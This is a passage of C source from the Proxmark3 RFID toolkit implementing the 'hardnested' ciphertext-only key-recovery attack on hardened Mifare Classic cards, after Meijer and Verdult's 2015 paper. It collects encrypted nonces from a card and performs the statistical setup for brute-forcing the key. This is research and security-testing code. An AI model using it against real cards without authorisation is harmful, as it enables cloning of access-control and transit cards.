//-----------------------------------------------------------------------------
// Copyright (C) 2015 piwi
// Edited: Loek Sangers and Romke van Dijk, Jan 2016 (All credit for teh actual implimentain fo the hardnested attack goes to piwi, we just addapted teh attack to work with our code nicely, to do this we renamed a lot of things, but the logic remains mainly piwiś)
//
// This code is licensed to you under the terms of the GNU GPL, version 2 or,
// at your option, any later version. See the LICENSE.txt file for the text of
// the license.
//-----------------------------------------------------------------------------
// Implements a card only attack based on crypto text (encrypted nonces
// received during a nested authentication) only. Unlike other card only
// attacks this doesn't rely on implementation errors but only on the
// inherent weaknesses of the crypto1 cypher. Described in
//   Carlo Meijer, Roel Verdult, "Ciphertext-only Cryptanalysis on Hardened
//   Mifare Classic Cards" in Proceedings of the 22nd ACM SIGSAC Conference on 
//   Computer and Communications Security, 2015
//-----------------------------------------------------------------------------

#include <stdio.h>
#include <stdlib.h> 
#include <string.h>
#include <pthread.h>
#include <locale.h>
#include <math.h>
#include <sqlite3.h>

#include "proxmark3.h"
#include "cmdmain.h"
#include "ui.h"
#include "util.h"
#include "nonce2key/crapto1.h"
#include "parity.h"
#include "cmdhfmfhard.h"
#include "mifarehost.h"

 const float bump_p_K[257] = {		// the probability that a random nonce has a Sum Property == K
	0.0290, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 
	0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000,
	0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 
	0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000,
	0.0083, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 
	0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000,
	0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 
	0.0006, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000,
	0.0339, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 
	0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000,
	0.0048, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 
	0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000,
	0.0934, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 
	0.0119, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000,
	0.0489, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 
	0.0602, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000,
	0.4180, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 
	0.0602, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000,
	0.0489, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 
	0.0119, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000,
	0.0934, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 
	0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000,
	0.0048, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 
	0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000,
	0.0339, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 
	0.0006, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000,
	0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 
	0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000,
	0.0083, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 
	0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000,
	0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000,
	0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000,
	0.0290 };

#define CONFIDENCE_THRESHOLD	0.95		// Collect nonces until we are certain enough that the following brute force is successfull
#define GOOD_BYTES_REQUIRED		5

#define STATELIST_INDEX_WIDTH 16
#define STATELIST_INDEX_SIZE (1<<STATELIST_INDEX_WIDTH)

typedef struct noncelistentry {
	uint32_t nonce_enc;
	uint8_t par_enc;
	void *next;
} noncelistentry_t;

typedef struct noncelist {
	uint16_t num;
	uint16_t Sum;
	uint16_t Sum8_guess;
	uint8_t BitFlip[2];
	float Sum8_prob;
	bool updated;
	noncelistentry_t *first;
	float score1, score2;
} noncelist_t;

typedef enum {
	EVEN_STATE = 0,
	ODD_STATE = 1
} odd_even_t;

typedef struct {
	uint32_t *states[2];
	uint32_t len[2];
	uint32_t *index[2][STATELIST_INDEX_SIZE];
} partial_indexed_statelist_t;

typedef struct {
	uint32_t *states[2];
	uint32_t len[2];
	void* next;
} statelist_t;

 uint32_t bump_cuid;
 noncelist_t bump_nonces[256];
 uint8_t bump_best_first_bytes[256];
 uint16_t bump_first_byte_Sum = 0;
 uint16_t bump_first_byte_num = 0;
 uint16_t bump_num_good_first_bytes = 0;
 uint64_t bump_maximum_states = 0;
 uint64_t bump_known_target_key;
 bool bump_write_stats = false;
 FILE *bump_fstats = NULL;

 partial_indexed_statelist_t bump_partial_statelist[17];
 partial_indexed_statelist_t bump_statelist_bitflip;

 statelist_t *bump_candidates = NULL;


int bump_add_nonce(uint32_t nonce_enc, uint8_t par_enc)
{
	uint8_t first_byte = nonce_enc >> 24;
	noncelistentry_t *p1 = bump_nonces[first_byte].first;
	noncelistentry_t *p2 = NULL;

	if (p1 == NULL) {			// first nonce with this 1st byte
		bump_first_byte_num++;
		bump_first_byte_Sum += evenparity32((nonce_enc & 0xff000000) | (par_enc & 0x08));
		// printf("Adding nonce 0x%08x, par_enc 0x%02x, parity(0x%08x) = %d\n", 
			// nonce_enc, 
			// par_enc, 
			// (nonce_enc & 0xff000000) | (par_enc & 0x08) |0x01, 
			// parity((nonce_enc & 0xff000000) | (par_enc & 0x08));
	}

	while (p1 != NULL && (p1->nonce_enc & 0x00ff0000) < (nonce_enc & 0x00ff0000)) {
		p2 = p1;
		p1 = p1->next;
	}
	
	if (p1 == NULL) { 																	// need to add at the end of the list
		if (p2 == NULL) { 			// list is empty yet. Add first entry.
			p2 = bump_nonces[first_byte].first = malloc(sizeof(noncelistentry_t));
		} else {					// add new entry at end of existing list.
			p2 = p2->next = malloc(sizeof(noncelistentry_t));
		}
	} else if ((p1->nonce_enc & 0x00ff0000) != (nonce_enc & 0x00ff0000)) {				// found distinct 2nd byte. Need to insert.
		if (p2 == NULL) {			// need to insert at start of list
			p2 = bump_nonces[first_byte].first = malloc(sizeof(noncelistentry_t));
		} else {
			p2 = p2->next = malloc(sizeof(noncelistentry_t));
		}
	} else {											// we have seen this 2nd byte before. Nothing to add or insert. 
		return (0);
	}

	// add or insert new data
	p2->next = p1;
	p2->nonce_enc = nonce_enc;
	p2->par_enc = par_enc;

	bump_nonces[first_byte].num++;
	bump_nonces[first_byte].Sum += evenparity32((nonce_enc & 0x00ff0000) | (par_enc & 0x04));
	bump_nonces[first_byte].updated = true;   // indicates that we need to recalculate the Sum(a8) probability for this first byte

	return (1);				// new nonce added
}


void bump_init_nonce_memory(void)
{
	for (uint16_t i = 0; i < 256; i++) {
		bump_nonces[i].num = 0;
		bump_nonces[i].Sum = 0;
		bump_nonces[i].Sum8_guess = 0;
		bump_nonces[i].Sum8_prob = 0.0;
		bump_nonces[i].updated = true;
		bump_nonces[i].first = NULL;
	}
	bump_first_byte_num = 0;
	bump_first_byte_Sum = 0;
	bump_num_good_first_bytes = 0;
}


void bump_free_nonce_list(noncelistentry_t *p)
{
	if (p == NULL) {
		return;
	} else {
		bump_free_nonce_list(p->next);
		free(p);
	}
}


void bump_free_nonces_memory(void)
{
	for (uint16_t i = 0; i < 256; i++) {
		bump_free_nonce_list(bump_nonces[i].first);
	}
}


uint16_t bump_PartialSumProperty(uint32_t state, odd_even_t odd_even)
{ 
	uint16_t sum = 0;
	for (uint16_t j = 0; j < 16; j++) {
		uint32_t st = state;
		uint16_t part_sum = 0;
		if (odd_even == ODD_STATE) {
			for (uint16_t i = 0; i < 5; i++) {
				part_sum ^= filter(st);
				st = (st << 1) | ((j >> (3-i)) & 0x01) ;
			}
			part_sum ^= 1;		// XOR 1 cancelled out for the other 8 bits
		} else {
			for (uint16_t i = 0; i < 4; i++) {
				st = (st << 1) | ((j >> (3-i)) & 0x01) ;
				part_sum ^= filter(st);
			}
		}
		sum += part_sum;
	}
	return sum;
}


//  uint16_t SumProperty(struct Crypto1State *s)
// {
	// uint16_t sum_odd = bump_PartialSumProperty(s->odd, ODD_STATE);
	// uint16_t sum_even = bump_PartialSumProperty(s->even, EVEN_STATE);
	// return (sum_odd*(16-sum_even) + (16-sum_odd)*sum_even);
// }


double bump_p_hypergeometric(uint16_t N, uint16_t K, uint16_t n, uint16_t k)
{
	// for efficient computation we are using the recursive definition
	//						(K-k+1) * (n-k+1)
	// P(X=k) = P(X=k-1) * --------------------
	//						   k * (N-K-n+k)
	// and
	//           (N-K)*(N-K-1)*...*(N-K-n+1)
	// P(X=0) = -----------------------------
	//               N*(N-1)*...*(N-n+1)

	if (n-k > N-K || k > K) return 0.0;	// avoids log(x<=0) in calculation below
	if (k == 0) {
		// use logarithms to avoid overflow with huge factorials (double type can only hold 170!)
		double log_result = 0.0;
		for (int16_t i = N-K; i >= N-K-n+1; i--) {
			log_result += log(i);
		} 
		for (int16_t i = N; i >= N-n+1; i--) {
			log_result -= log(i);
		}
		return exp(log_result);
	} else {
		if (n-k == N-K) {	// special case. The published recursion below would fail with a divide by zero exception
			double log_result = 0.0;
			for (int16_t i = k+1; i <= n; i++) {
				log_result += log(i);
			}
			for (int16_t i = K+1; i <= N; i++) {
				log_result -= log(i);
			}
			return exp(log_result);
		} else { 			// recursion
			return (bump_p_hypergeometric(N, K, n, k-1) * (K-k+1) * (n-k+1) / (k * (N-K-n+k)));
		}
	}
}
	
	
float bump_sum_probability(uint16_t K, uint16_t n, uint16_t k)
{
	const uint16_t N = 256;
	
	

		if (k > K || bump_p_K[K] == 0.0) return 0.0;

		double p_T_is_k_when_S_is_K = bump_p_hypergeometric(N, K, n, k);
		double p_S_is_K = bump_p_K[K];
		double p_T_is_k = 0;
		for (uint16_t i = 0; i <= 256; i++) {
			if (bump_p_K[i] != 0.0) {
				p_T_is_k += bump_p_K[i] * bump_p_hypergeometric(N, i, n, k);
			}
		}
		return(p_T_is_k_when_S_is_K * p_S_is_K / p_T_is_k);
}

		

	
inline uint_fast8_t bump_common_bits(uint_fast8_t bytes_diff)
{
	 const uint_fast8_t bump_common_bits_LUT[256] = {
		8, 0, 1, 0, 2, 0, 1, 0,	3, 0, 1, 0, 2, 0, 1, 0,
		4, 0, 1, 0, 2, 0, 1, 0,	3, 0, 1, 0, 2, 0, 1, 0,
		5, 0, 1, 0, 2, 0, 1, 0,	3, 0, 1, 0, 2, 0, 1, 0,
		4, 0, 1, 0, 2, 0, 1, 0,	3, 0, 1, 0, 2, 0, 1, 0,
		6, 0, 1, 0, 2, 0, 1, 0,	3, 0, 1, 0, 2, 0, 1, 0,
		4, 0, 1, 0, 2, 0, 1, 0,	3, 0, 1, 0, 2, 0, 1, 0,
		5, 0, 1, 0, 2, 0, 1, 0,	3, 0, 1, 0, 2, 0, 1, 0,
		4, 0, 1, 0, 2, 0, 1, 0,	3, 0, 1, 0, 2, 0, 1, 0,
		7, 0, 1, 0, 2, 0, 1, 0,	3, 0, 1, 0, 2, 0, 1, 0,
		4, 0, 1, 0, 2, 0, 1, 0,	3, 0, 1, 0, 2, 0, 1, 0,
		5, 0, 1, 0, 2, 0, 1, 0,	3, 0, 1, 0, 2, 0, 1, 0,
		4, 0, 1, 0, 2, 0, 1, 0,	3, 0, 1, 0, 2, 0, 1, 0,
		6, 0, 1, 0, 2, 0, 1, 0,	3, 0, 1, 0, 2, 0, 1, 0,
		4, 0, 1, 0, 2, 0, 1, 0,	3, 0, 1, 0, 2, 0, 1, 0,
		5, 0, 1, 0, 2, 0, 1, 0,	3, 0, 1, 0, 2, 0, 1, 0,
		4, 0, 1, 0, 2, 0, 1, 0,	3, 0, 1, 0, 2, 0, 1, 0
	};

	return bump_common_bits_LUT[bytes_diff];
}


void bump_Tests()
{
	printf("\n bump_Tests: Actual BitFlipProperties odd/even:\n");
	for (uint16_t i = 0; i < 256; i++) {
		printf("[%02x]:%c  ", i, bump_nonces[i].BitFlip[ODD_STATE]?'o':bump_nonces[i].BitFlip[EVEN_STATE]?'e':' ');
		if (i % 8 == 7) {
			printf("\n");
		}
	}
	
	printf("\n bump_Tests: Sorted First Bytes:\n");
	for (uint16_t i = 0; i < 256; i++) {
		uint8_t best_byte = bump_best_first_bytes[i];
		printf("#%03d Byte: %02x, n = %3d, k = %3d, Sum(a8): %3d, Confidence: %5.1f%%, Bitflip: %c\n", 
		//printf("#%03d Byte: %02x, n = %3d, k = %3d, Sum(a8): %3d, Confidence: %5.1f%%, Bitflip: %c, score1: %1.5f, score2: %1.0f\n", 
			i, best_byte, 
			bump_nonces[best_byte].num,
			bump_nonces[best_byte].Sum,
			bump_nonces[best_byte].Sum8_guess,
			bump_nonces[best_byte].Sum8_prob * 100,
			bump_nonces[best_byte].BitFlip[ODD_STATE]?'o':bump_nonces[best_byte].BitFlip[EVEN_STATE]?'e':' '
			//bump_nonces[best_byte].score1,
			//bump_nonces[best_byte].score2
			);
	}
	
}


 void bump_sort_best_first_bytes(void)
{
	// sort based on probability for correct guess	
	for (uint16_t i = 0; i < 256; i++ ) {
		uint16_t j = 0;
		float prob1 = bump_nonces[i].Sum8_prob;
		float prob2 = bump_nonces[bump_best_first_bytes[0]].Sum8_prob;
		while (prob1 < prob2 && j < i) {
			prob2 = bump_nonces[bump_best_first_bytes[++j]].Sum8_prob;
		}
		if (j < i) {
			for (uint16_t k = i; k > j; k--) {
				bump_best_first_bytes[k] = bump_best_first_bytes[k-1];
			}
		}
		bump_best_first_bytes[j] = i;
	}

	// determine how many are above the CONFIDENCE_THRESHOLD
	uint16_t num_good_nonces = 0;
	for (uint16_t i = 0; i < 256; i++) {
		if (bump_nonces[bump_best_first_bytes[i]].Sum8_prob > CONFIDENCE_THRESHOLD) {
			++num_good_nonces;
		}
	}
	
	uint16_t best_first_byte = 0;

	// select the best possible first byte based on number of common bits with all {b'}
	// uint16_t max_bump_common_bits = 0;
	// for (uint16_t i = 0; i < num_good_nonces; i++) {
		// uint16_t sum_bump_common_bits = 0;
		// for (uint16_t j = 0; j < num_good_nonces; j++) {
			// if (i != j) {
				// sum_bump_common_bits += bump_common_bits(bump_best_first_bytes[i],bump_best_first_bytes[j]);
			// }
		// }
		// if (sum_bump_common_bits > max_bump_common_bits) {
			// max_bump_common_bits = sum_bump_common_bits;
			// best_first_byte = i;
		// }
	// }

	// select best possible first byte {b} based on least likely sum/bitflip property
	float min_bump_p_K = 1.0;
	for (uint16_t i = 0; i < num_good_nonces; i++ ) {
		uint16_t sum8 = bump_nonces[bump_best_first_bytes[i]].Sum8_guess;
		float bitflip_prob = 1.0;
		if (bump_nonces[bump_best_first_bytes[i]].BitFlip[ODD_STATE] || bump_nonces[bump_best_first_bytes[i]].BitFlip[EVEN_STATE]) {
			bitflip_prob = 0.09375;
		}
		bump_nonces[bump_best_first_bytes[i]].score1 = bump_p_K[sum8] * bitflip_prob;
		if (bump_p_K[sum8] * bitflip_prob <= min_bump_p_K) {
			min_bump_p_K = bump_p_K[sum8] * bitflip_prob;
		}
	}

	
	// use number of commmon bits as a tie breaker
	uint16_t max_bump_common_bits = 0;
	for (uint16_t i = 0; i < num_good_nonces; i++) {
		float bitflip_prob = 1.0;
		if (bump_nonces[bump_best_first_bytes[i]].BitFlip[ODD_STATE] || bump_nonces[bump_best_first_bytes[i]].BitFlip[EVEN_STATE]) {
			bitflip_prob = 0.09375;
		}
		if (bump_p_K[bump_nonces[bump_best_first_bytes[i]].Sum8_guess] * bitflip_prob == min_bump_p_K) {
			uint16_t sum_bump_common_bits = 0;
			for (uint16_t j = 0; j < num_good_nonces; j++) {
				sum_bump_common_bits += bump_common_bits(bump_best_first_bytes[i] ^ bump_best_first_bytes[j]);
			}
			bump_nonces[bump_best_first_bytes[i]].score2 = sum_bump_common_bits;
			if (sum_bump_common_bits > max_bump_common_bits) {
				max_bump_common_bits = sum_bump_common_bits;
				best_first_byte = i;
			}
		}
	}	

	// swap best possible first byte to the pole position
	uint16_t temp = bump_best_first_bytes[0];
	bump_best_first_bytes[0] = bump_best_first_bytes[best_first_byte];
	bump_best_first_bytes[best_first_byte] = temp;
	
}
	
	
 uint16_t bump_estimate_second_byte_sum(void)
{

	for (uint16_t first_byte = 0; first_byte < 256; first_byte++) {
		float Sum8_prob = 0.0;
		uint16_t Sum8 = 0;
		if (bump_nonces[first_byte].updated) {
			for (uint16_t sum = 0; sum <= 256; sum++) {
				float prob = bump_sum_probability(sum, bump_nonces[first_byte].num, bump_nonces[first_byte].Sum);
				if (prob > Sum8_prob) {
					Sum8_prob = prob;
					Sum8 = sum;
				}
			}
			bump_nonces[first_byte].Sum8_guess = Sum8;
			bump_nonces[first_byte].Sum8_prob = Sum8_prob;
			bump_nonces[first_byte].updated = false;
		}
	}
	
	bump_sort_best_first_bytes();

	uint16_t num_good_nonces = 0;
	for (uint16_t i = 0; i < 256; i++) {
		if (bump_nonces[bump_best_first_bytes[i]].Sum8_prob > CONFIDENCE_THRESHOLD) {
			++num_good_nonces;
		}
	}
	
	return num_good_nonces;
}	


 int bump_read_nonce_file(void)
{
	FILE *fnonces = NULL;
	uint8_t trgBlockNo;
	uint8_t trgKeyType;
	uint8_t bump_read_buf[9];
	uint32_t nt_enc1, nt_enc2;
	uint8_t par_enc;
	int total_num_nonces = 0;
	
	if ((fnonces = fopen("nonces.bin","rb")) == NULL) { 
		PrintAndLog("Could not open file nonces.bin");
		return 1;
	}

	PrintAndLog("Reading nonces from file nonces.bin...");
	if (fread(bump_read_buf, 1, 6, fnonces) == 0) {
		PrintAndLog("File reading error.");
		fclose(fnonces);
		return 1;
	}
	bump_cuid = bytes_to_num(bump_read_buf, 4);
	trgBlockNo = bytes_to_num(bump_read_buf+4, 1);
	trgKeyType = bytes_to_num(bump_read_buf+5, 1);

	while (fread(bump_read_buf, 1, 9, fnonces) == 9) {
		nt_enc1 = bytes_to_num(bump_read_buf, 4);
		nt_enc2 = bytes_to_num(bump_read_buf+4, 4);
		par_enc = bytes_to_num(bump_read_buf+8, 1);
		//printf("Encrypted nonce: %08x, encrypted_parity: %02x\n", nt_enc1, par_enc >> 4);
		//printf("Encrypted nonce: %08x, encrypted_parity: %02x\n", nt_enc2, par_enc & 0x0f);
		bump_add_nonce(nt_enc1, par_enc >> 4);
		bump_add_nonce(nt_enc2, par_enc & 0x0f);
		total_num_nonces += 2;
	}
	fclose(fnonces);
	PrintAndLog("Read %d nonces from file. bump_cuid=%08x, Block=%d, Keytype=%c", total_num_nonces, bump_cuid, trgBlockNo, trgKeyType==0?'A':'B');

	return 0;
}


 void bump_Check_for_FilterFlipProperties(void)
{
	printf("Checking for Filter Flip Properties...\n");

	uint16_t num_bitflips = 0;
	
	for (uint16_t i = 0; i < 256; i++) {
		bump_nonces[i].BitFlip[ODD_STATE] = false;
		bump_nonces[i].BitFlip[EVEN_STATE] = false;
	}
	
	for (uint16_t i = 0; i < 256; i++) {
		uint8_t parity1 = (bump_nonces[i].first->par_enc) >> 3;				// parity of first byte
		uint8_t parity2_odd = (bump_nonces[i^0x80].first->par_enc) >> 3;  	// XOR 0x80 = last bit flipped
		uint8_t parity2_even = (bump_nonces[i^0x40].first->par_enc) >> 3;	// XOR 0x40 = second last bit flipped
		
		if (parity1 == parity2_odd) {				// has Bit Flip Property for odd bits
			bump_nonces[i].BitFlip[ODD_STATE] = true;
			num_bitflips++;
		} else if (parity1 == parity2_even) {		// has Bit Flip Property for even bits
			bump_nonces[i].BitFlip[EVEN_STATE] = true;
			num_bitflips++;
		}
	}
	
	if (bump_write_stats) {
		fprintf(bump_fstats, "%d;", num_bitflips);
	}
}


 void bump_simulate_MFplus_RNG(uint32_t test_bump_cuid, uint64_t test_key, uint32_t *nt_enc, uint8_t *par_enc)
{
	struct Crypto1State sim_cs;

	// init cryptostate with key:
	for(int8_t i = 47; i > 0; i -= 2) {
		sim_cs.odd  = sim_cs.odd  << 1 | BIT(test_key, (i - 1) ^ 7);
		sim_cs.even = sim_cs.even << 1 | BIT(test_key, i ^ 7);
	}

	*par_enc = 0;
	uint32_t nt = (rand() & 0xff) << 24 | (rand() & 0xff) << 16 | (rand() & 0xff) << 8 | (rand() & 0xff);
	for (int8_t byte_pos = 3; byte_pos >= 0; byte_pos--) {
		uint8_t nt_byte_dec = (nt >> (8*byte_pos)) & 0xff;
		uint8_t nt_byte_enc = crypto1_byte(&sim_cs, nt_byte_dec ^ (test_bump_cuid >> (8*byte_pos)), false) ^ nt_byte_dec; 	// encode the nonce byte
		*nt_enc = (*nt_enc << 8) | nt_byte_enc;		
		uint8_t ks_par = filter(sim_cs.odd);											// the keystream bit to encode/decode the parity bit
		uint8_t nt_byte_par_enc = ks_par ^ oddparity8(nt_byte_dec);						// determine the nt byte's parity and encode it
		*par_enc = (*par_enc << 1) | nt_byte_par_enc;
	}
	
}


 void simulate_bump_acquire_nonces()
{
	clock_t time1 = clock();
	bool filter_flip_checked = false;
	uint32_t total_num_nonces = 0;
	uint32_t next_fivehundred = 500;
	uint32_t total_added_nonces = 0;

	bump_cuid = (rand() & 0xff) << 24 | (rand() & 0xff) << 16 | (rand() & 0xff) << 8 | (rand() & 0xff);
	bump_known_target_key = ((uint64_t)rand() & 0xfff) << 36 | ((uint64_t)rand() & 0xfff) << 24 | ((uint64_t)rand() & 0xfff) << 12 | ((uint64_t)rand() & 0xfff);
	
	printf("Simulating nonce acquisition for target key %012"llx", bump_cuid %08x ...\n", bump_known_target_key, bump_cuid);
	fprintf(bump_fstats, "%012"llx";%08x;", bump_known_target_key, bump_cuid);
	
	do {
		uint32_t nt_enc = 0;
		uint8_t par_enc = 0;

		bump_simulate_MFplus_RNG(bump_cuid, bump_known_target_key, &nt_enc, &par_enc);
		//printf("Simulated RNG: nt_enc1: %08x, nt_enc2: %08x, par_enc: %02x\n", nt_enc1, nt_enc2, par_enc);
		total_added_nonces += bump_add_nonce(nt_enc, par_enc);
		total_num_nonces++;
		
		if (bump_first_byte_num == 256 ) {
			// printf("bump_first_byte_num = %d, bump_first_byte_Sum = %d\n", bump_first_byte_num, bump_first_byte_Sum);
			if (!filter_flip_checked) {
				bump_Check_for_FilterFlipProperties();
				filter_flip_checked = true;
			}
			bump_num_good_first_bytes = bump_estimate_second_byte_sum();
			if (total_num_nonces > next_fivehundred) {
				next_fivehundred = (total_num_nonces/500+1) * 500;
				printf("Acquired %5d nonces (%5d with distinct bytes 0 and 1). Number of bytes with probability for correctly guessed Sum(a8) > %1.1f%%: %d\n",
					total_num_nonces, 
					total_added_nonces,
					CONFIDENCE_THRESHOLD * 100.0,
					bump_num_good_first_bytes);
			}
		}

	} while (bump_num_good_first_bytes < GOOD_BYTES_REQUIRED);
	
	PrintAndLog("Acquired a total of %d nonces in %1.1f seconds (%0.0f nonces/minute)", 
		total_num_nonces, 
		((float)clock()-time1)/CLOCKS_PER_SEC, 
		total_num_nonces*60.0*CLOCKS_PER_SEC/((float)clock()-time1));

	fprintf(bump_fstats, "%d;%d;%d;%1.2f;", total_num_nonces, total_added_nonces, bump_num_good_first_bytes, CONFIDENCE_THRESHOLD);
		
}


 int bump_acquire_nonces(uint64_t uid, uint8_t blockNo, uint8_t keyType, uint8_t *key, uint8_t trgBlockNo, uint8_t trgKeyType)
{
	clock_t time1 = clock();
	bool initialize = true;
	bool field_off = false;
	bool finished = false;
	bool filter_flip_checked = false;
	uint32_t flags = 0;
	uint8_t write_buf[10];
	uint32_t total_num_nonces = 0;
	uint32_t next_fivehundred = 500;
	uint32_t total_added_nonces = 0;
	FILE *fnonces = NULL;
	UsbCommand resp;

	char fname[20];
	snprintf(fname, sizeof(fname), "%08"llx"%03d%d.bin", uid, trgBlockNo, trgKeyType);
	printf("Acquiring nonces...\n");
	
	clearCommandBuffer();

	do {
		flags = 0;
		flags |= initialize ? 0x0001 : 0;
		flags |= field_off ? 0x0004 : 0;
		UsbCommand c = {CMD_BUMP_ACQUIRE_ENCRYPTED_NONCES, {blockNo + keyType * 0x100, trgBlockNo + trgKeyType * 0x100, flags}};
		memcpy(c.d.asBytes, key, 6);
		num_to_bytes(uid, 4, write_buf);
		memcpy(c.d.asBytes + 6, write_buf, 4);

		SendCommand(&c);
		
		if (field_off) finished = true;
		
		if (initialize) {
			if (!WaitForResponseTimeout(CMD_ACK, &resp, 3000)) return 1;
			if (resp.arg[0]) return resp.arg[0];  // error during nested_hard

			bump_cuid = resp.arg[1];
			// PrintAndLog("Acquiring nonces for CUID 0x%08x", bump_cuid);
			if (fnonces == NULL) {
				if(access( fname, F_OK ) != -1){
					PrintAndLog(" file %s already exists, so nonces have been gathered before!", fname);
					return 4;

				}
				if ((fnonces = fopen(fname,"wb")) == NULL) {
					PrintAndLog("Could not create file %s", fname);
					return 3;
				}
				PrintAndLog("Writing acquired nonces to binary file %s", fname);
			}
		}

		if (!initialize) {
			uint32_t nt_enc1, nt_enc2;
			uint8_t par_enc;
			uint16_t num_acquired_nonces = resp.arg[2];
			uint8_t *bufp = resp.d.asBytes;
			for (uint16_t i = 0; i < num_acquired_nonces; i+=2) {
				nt_enc1 = bytes_to_num(bufp, 4);
				nt_enc2 = bytes_to_num(bufp+4, 4);
				par_enc = bytes_to_num(bufp+8, 1);
				
				total_added_nonces += bump_add_nonce(nt_enc1, par_enc >> 4);
				total_added_nonces += bump_add_nonce(nt_enc2, par_enc & 0x0f);

				for (int j = 0; j < 4; j++) {

					int oddparity = 0x01;
					int k;

					for (k=0 ; k<8 ; k++) {
						oddparity ^= (((bufp[j] & 0xFF) >> k) & 0x01);
					}
					uint8_t parityBits = bufp[8];
					if (oddparity != ((parityBits >> (7-(j&0x0007))) & 0x01)) {
						fprintf(fnonces, "%02x! ", bufp[j]);
					} else {
						fprintf(fnonces, "%02x  ", bufp[j]);
					}

				}
		        fprintf(fnonces, "\n");

		        for (int j = 0; j < 4; j++) {

					int oddparity = 0x01;
					int k;

					for (k=0 ; k<8 ; k++) {
						oddparity ^= (((bufp[4 + j] & 0xFF) >> k) & 0x01);
					}
					uint8_t parityBits = bufp[8] << 4;
					if (oddparity != ((parityBits >> (7-(j&0x0007))) & 0x01)) {
						fprintf(fnonces, "%02x! ", bufp[4 + j]);
					} else {
						fprintf(fnonces, "%02x  ", bufp[4 + j]);
					}

		        }
		        fprintf(fnonces, "\n");

				bufp += 9;
			}

			total_num_nonces += num_acquired_nonces;
		}
		
		if (bump_first_byte_num == 256 ) {
			// printf("bump_first_byte_num = %d, bump_first_byte_Sum = %d\n", bump_first_byte_num, bump_first_byte_Sum);
			if (!filter_flip_checked) {
				bump_Check_for_FilterFlipProperties();
				filter_flip_checked = true;
			}
			bump_num_good_first_bytes = bump_estimate_second_byte_sum();
			if (total_num_nonces > next_fivehundred) {
				next_fivehundred = (total_num_nonces/500+1) * 500;
				printf("Acquired %5d nonces (%5d with distinct bytes 0 and 1). Number of bytes with probability for correctly guessed Sum(a8) > %1.1f%%: %d\n",
					total_num_nonces, 
					total_added_nonces,
					CONFIDENCE_THRESHOLD * 100.0,
					bump_num_good_first_bytes);
			}
			if (bump_num_good_first_bytes >= GOOD_BYTES_REQUIRED) {
				field_off = true;	// switch off field with next SendCommand and then finish
			}

			// Sometimes it is not going very well... Lets skip one sector if it takes more than 10.000 nonces...
			if (total_num_nonces >= 10000) {
				field_off = true;
			}
		}

		if (!initialize) {
			if (!WaitForResponseTimeout(CMD_ACK, &resp, 3000)) return 1;
			if (resp.arg[0]) return resp.arg[0];  // error during nested_hard
		}

		initialize = false;

	} while (!finished);

	
	fclose(fnonces);
	fnonces = NULL;
	
	PrintAndLog("Acquired a total of %d nonces in %1.1f seconds (%0.0f nonces/minute)", 
		total_num_nonces, 
		((float)clock()-time1)/CLOCKS_PER_SEC, 
		total_num_nonces*60.0*CLOCKS_PER_SEC/((float)clock()-time1));
	
	return 0;
}


 int bump_init_partial_statelists(void)
{
	const uint32_t sizes_odd[17] = { 126757, 0, 18387, 0, 74241, 0, 181737, 0, 248801, 0, 182033, 0, 73421, 0, 17607, 0, 125601 };
	const uint32_t sizes_even[17] = { 125723, 0, 17867, 0, 74305, 0, 178707, 0, 248801, 0, 185063, 0, 73356, 0, 18127, 0, 126634 };
	
	printf("Allocating memory for partial statelists...\n");
	for (odd_even_t odd_even = EVEN_STATE; odd_even <= ODD_STATE; odd_even++) {
		for (uint16_t i = 0; i <= 16; i+=2) {
			bump_partial_statelist[i].len[odd_even] = 0;
			uint32_t num_of_states = odd_even == ODD_STATE ? sizes_odd[i] : sizes_even[i];
			bump_partial_statelist[i].states[odd_even] = malloc(sizeof(uint32_t) * num_of_states);
			if (bump_partial_statelist[i].states[odd_even] == NULL) {
				PrintAndLog("Cannot allocate enough memory. Aborting");
				return 4;
			}
			for (uint32_t j = 0; j < STATELIST_INDEX_SIZE; j++) {
